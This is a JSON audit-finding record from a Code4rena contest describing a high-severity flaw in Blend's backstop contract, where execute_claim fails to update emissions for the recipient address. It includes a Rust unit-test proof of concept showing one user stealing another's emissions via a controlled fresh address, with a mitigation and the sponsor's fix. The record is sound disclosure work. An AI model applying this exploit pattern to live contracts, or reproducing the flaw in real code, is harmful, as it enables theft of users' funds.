@@ -1,0 +1,65 @@
+{
+    "id": 62062,
+    "kind": "GIT",
+    "auditfirm_id": 2,
+    "impact": "HIGH",
+    "finders_count": 5,
+    "protocol_id": 2159,
+    "title": "[H-02] User can steal other users’ emissions due to vulnerable claim implementation",
+    "content": "\n\n<https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/contract.rs# L1>\n\n### Finding description\n\n`backstop::emissions::execute_claim` is missing `update_emissions` for `to` address which allows a user stealing other users’ emissions.\n\n### Proof of Concept\n\nWhen a user deposit to backstop, `update_emissions` needs to be [called atomically before `user_balance` update](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/backstop/deposit.rs# L17) to ensure user emissions are initialized correctly; e.g. if user has zero share, their emission data should be [intiralized first to current index](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/distributor.rs# L122-L124).\n\nHowever, in `execute_claim`, when `from ≠ to`, the exchanged backstop LPs are deposited to `to` address but `update_emissions` is missing. This means `to`’s balance is updated without syncing/initializing their emission data first before the balance change. This introduces a state synchronization conflict.\n`to`’s emissions will be inflated.\n```\n\npub fn execute_claim(e: &Env, from: &Address, pool_addresses: &Vec<Address>, to: &Address) -> i128 {\n...\n            for pool_id in pool_addresses.iter() {\n                        let claim_amount = claims.get(pool_id.clone()).unwrap();\n            let deposit_amount = lp_tokens_out\n                .fixed_mul_floor(claim_amount, claimed)\n                .unwrap();\n            let mut pool_balance = storage::get_pool_balance(e, &pool_id);\n            let mut user_balance = storage::get_user_balance(e, &pool_id, to);\n\n            // Deposit LP tokens into pool backstop\n            let to_mint = pool_balance.convert_to_shares(deposit_amount);\n            pool_balance.deposit(deposit_amount, to_mint);\n            //@audit `to`'s balance is updated without update_emissions. `to`'s emission data is not synced/ initialized.\n|>          user_balance.add_shares(to_mint);\n\n            storage::set_pool_balance(e, &pool_id, &pool_balance);\n            storage::set_user_balance(e, &pool_id, to, &user_balance);\n\n            BackstopEvents::deposit(e, pool_id, to.clone(), deposit_amount, to_mint);\n        }\n        ...\n```\n\n<https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/claim.rs# L66>\n\nFlows: `backstop::claim -> emissions::execute_claim`\n\nOne exploit scenarios is a user can `execute_claim` into an address of their control and such address has no user balance.\n\n### Coded PoC\n\nSuppose userA and userB have deposited equal share in backstop module. userA controls addressC which has no user emission data.\n\n1. userA claim emissions and deposit to addressC.\n2. userA immediately claim emissions again through addressC. addressC claimed historical emissions even though it has 0 share prior to userA’s first claim.\n3. userB tries to claim their emissions. tx revert due to insufficient funds.\n   userA stole emissions from userB successfully.\n\nSee added unit test `test_user_steal_emissions()` in `backstop/src/emissions/claim.rs`. Run test: `cargo test test_user_steal_emissions`.\n```\n\n    #[test]\n    #[should_panic(expected = \"Error(Contract, # 10)\")]\n    fn test_user_steal_emissions() {\n        let e = Env::default();\n        e.mock_all_auths();\n        let block_timestamp = 1500000000 + 12345;\n        e.ledger().set(LedgerInfo {\n            timestamp: block_timestamp,\n            protocol_version: 22,\n            sequence_number: 0,\n            network_id: Default::default(),\n            base_reserve: 10,\n            min_temp_entry_ttl: 10,\n            min_persistent_entry_ttl: 10,\n            max_entry_ttl: 3110400,\n        });\n        e.cost_estimate().budget().reset_unlimited();\n\n        let backstop_address = create_backstop(&e);\n        let pool_1_id = Address::generate(&e);\n        let pool_2_id = Address::generate(&e);\n        let bombadil = Address::generate(&e);\n        let samwise = Address::generate(&e); // userA\n        let samwiseC = Address::generate(&e); // userA controlled\n        let frodo = Address::generate(&e); //userB\n\n        let (blnd_address, blnd_token_client) = create_blnd_token(&e, &backstop_address, &bombadil);\n        let (usdc_address, _) = create_usdc_token(&e, &backstop_address, &bombadil);\n\n        // set total emissions to backstop contract\n        blnd_token_client.mint(&backstop_address, &152_6310272);\n        let (lp_address, lp_client) =\n            create_comet_lp_pool(&e, &bombadil, &blnd_address, &usdc_address);\n\n        let backstop_1_emissions_data = BackstopEmissionData {\n            expiration: 1500000000 + 7 * 24 * 60 * 60,\n            eps: 0_10000000000000,\n            index: 222220000000,\n            last_time: 1500000000,\n        };\n        let user_1_emissions_data = UserEmissionData {\n            index: 111110000000,\n            accrued: 1_2345678,\n        };\n        e.as_contract(&backstop_address, || {\n            storage::set_backstop_emis_data(&e, &pool_1_id, &backstop_1_emissions_data);\n            storage::set_user_emis_data(&e, &pool_1_id, &samwise, &user_1_emissions_data);\n            storage::set_user_emis_data(&e, &pool_1_id, &frodo, &user_1_emissions_data);\n            storage::set_backstop_token(&e, &lp_address);\n            storage::set_blnd_token(&e, &blnd_address);\n            storage::set_rz_emission_index(&e, &1_00000000000000);\n            storage::set_rz_emis_data(\n                &e,\n                &pool_1_id,\n                &RzEmissionData {\n                    index: 0,\n                    accrued: 0,\n                },\n            );\n            storage::set_pool_balance(\n                &e,\n                &pool_1_id,\n                &PoolBalance {\n                    shares: 150_0000000,\n                    tokens: 200_0000000,\n                    q4w: 2_0000000,\n                },\n            );\n            // samwise has 9_0000000 shares\n            storage::set_user_balance(\n                &e,\n                &pool_1_id,\n                &samwise,\n                &UserBalance {\n                    shares: 9_0000000,\n                    q4w: vec![&e],\n                },\n            );\n            // frodo has 9_0000000 shares\n            storage::set_user_balance(\n                &e,\n                &pool_1_id,\n                &frodo,\n                &UserBalance {\n                    shares: 9_0000000,\n                    q4w: vec![&e],\n                },\n            );\n            //samwise claim to samwiseC (receives blend 76_3155136 converted into backstop LP deposited for samwiseC)\n            let result1 = execute_claim(&e, &samwise, &vec![&e, pool_1_id.clone()], &samwiseC);\n            assert_eq!(result1, 76_3155136);\n            //samwise immediately claim from samwiseC,\n            let result2 = execute_claim(&e, &samwiseC, &vec![&e, pool_1_id.clone()], &samwiseC);\n            assert_eq!(result2, 37_8984270); //samwiseC claims emissions without accumulation, stealing frodo's emissions.\n\n            execute_claim(&e, &frodo, &vec![&e, pool_1_id.clone()], &frodo); //frodo's claim will panic due to backstop doesn't have enough emissions to send to comet pool. panic with balanceError.\n        })\n    }\n```\n\nTest results:\n```\n\n     Running unittests src/lib.rs (target/debug/deps/backstop-70626b884282a67b)\n\nrunning 1 test\ntest emissions::claim::tests::test_user_steal_emissions - should panic ... ok\n\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 103 filtered out; finished in 0.24s\n```\n\n### Impact\n\nWhen `from != to`, `to` can claim part of other user’s emissions. A user can steal emissions by inputting a `to` address new to the backstop module. The attack can be repeated with multiple user controlled addresses.\n\n### Recommended mitigation steps\n\nIn execute*claim, add a logic when `from ≠ to` invoke `update*emissions`for`to`before adding shares to`to`.\n\n**markus\\_pl10 (Script3) confirmed**\n\n**Comments from the Script3 team:**\n\n> While this finding was excluded from the scope of the mitigation review, it was addressed [here](https://github.com/blend-capital/blend-contracts-v2/commit/77373e35f8fd91408df9a3f79d1e4443c13e8f4a# diff-4e48ac9f3873ec0958b7ca43ff935ccb7c9b2b391c088739b2ad751385e8f0c9) by removing the `to` address, which ensures that the exploit is no longer possible.\n\n---\n\n",
+    "summary": "\nThe bug report is about a missing function in the `backstop::emissions::execute_claim` code, which can lead to a user stealing the emissions of other users. This can happen when a user deposits to the backstop and the `update_emissions` function is not called before updating the user's balance. This causes a synchronization conflict and can result in the inflation of a user's emissions. To exploit this bug, a user can claim emissions and deposit them into an address they control, which has no user balance. They can then immediately claim emissions again, stealing emissions from other users. This can be repeated with multiple controlled addresses. The recommended mitigation step is to add a logic that calls the `update_emissions` function for the `to` address before adding shares. The issue has been addressed by removing the `to` address, making the exploit no longer possible.",
+    "report_date": "2025-08-13T00:00:00.000Z",
+    "contest_prize_txt": "125000",
+    "contest_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "sponsor_name": "Blend",
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "github_link": "https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-8",
+    "pdf_link": "",
+    "pdf_page_from": 0,
+    "contest_id": "492",
+    "slug": "h-02-user-can-steal-other-users-emissions-due-to-vulnerable-claim-implementation-code4rena-blend-blend-git",
+    "firm_name": "Code4rena",
+    "firm_logo_square": "code4rena_square.png",
+    "protocol_name": "Blend",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "oakcobalt"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "cu5t0mpeo"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0xabhay"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Testerbot"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "mahdikarimi"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Blend",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
